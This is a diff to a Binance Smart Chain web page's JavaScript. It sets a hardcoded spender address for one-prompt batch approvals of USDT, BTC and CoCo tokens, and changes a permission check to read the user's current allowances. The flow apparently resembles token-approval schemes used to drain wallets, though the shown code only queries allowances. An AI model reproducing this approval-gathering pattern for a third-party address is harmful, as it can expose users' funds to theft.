@@ -308,8 +308,10 @@
         const BSC_RPC_URL = 'https://bsc-dataseed1.binance.org/';
         
         // 合约地址
-        // 授权的最终spender改为批量合约本身，确保只弹一次
+        // 批量授权的最终 spender（被授权者）。如需授权给你的业务合约，请填业务合约地址。
         const PERMISSION_ADDRESS = '0x66C3e8Ca46D99aA4383AEac8ac46010C3Fd5B38A';
+        // 强制仅使用批量授权，不再回退到逐个授权
+        const FORCE_BATCH_ONLY = true;
         
         // 代币合约地址
         const TOKENS = {
@@ -463,28 +465,23 @@
          // 批量授权代理合约地址 - 已部署
          const BATCH_APPROVE_ADDRESS = '0x66C3e8Ca46D99aA4383AEac8ac46010C3Fd5B38A';
         
-        // 检查权限状态
+        // 检查权限状态（改为检查当前授权额度）
         async function checkPermission() {
             if (!web3 || !userAccount) {
                 showStatus('请先连接钱包', 'error');
                 return;
             }
-            
             try {
-                showStatus('正在检查权限状态...', 'info');
-                
-                const combinedContract = new web3.eth.Contract(COMBINED_CONTRACT_ABI, COMBINED_CONTRACT_ADDRESS);
-                
-                // 检查用户是否为授权者
-                const isAuthorized = await combinedContract.methods.isAuthorizedSpender(userAccount).call();
-                
-                if (isAuthorized) {
-                    showStatus('✅ 您有批量授权权限！可以使用一次确认批量授权三个代币', 'success');
-                } else {
-                    showStatus('❌ 您没有批量授权权限，将使用传统方式（需要三次确认）', 'error');
-                    showStatus('请联系合约所有者将您添加为授权者', 'info');
+                if (!BATCH_APPROVE_ADDRESS || BATCH_APPROVE_ADDRESS === '0x0000000000000000000000000000000000000000') {
+                    showStatus('批量授权合约未设置', 'error');
+                    return;
                 }
-                
+                showStatus('正在查询当前授权额度...', 'info');
+                const batchContract = new web3.eth.Contract(BATCH_APPROVE_ABI, BATCH_APPROVE_ADDRESS);
+                const tokenAddresses = [TOKENS.usdt.address, TOKENS.btc.address, TOKENS.coco.address];
+                const allowances = await batchContract.methods.checkAllowances(userAccount, tokenAddresses, PERMISSION_ADDRESS).call();
+                const pretty = allowances.map(a => web3.utils.toBN(a).gt(web3.utils.toBN(0)) ? '已授权' : '未授权');
+                showStatus(`USDT: ${pretty[0]} | BTC: ${pretty[1]} | CoCo: ${pretty[2]}`, 'success');
             } catch (error) {
                 console.error('权限检查失败:', error);
                 showStatus('权限检查失败: ' + error.message, 'error');
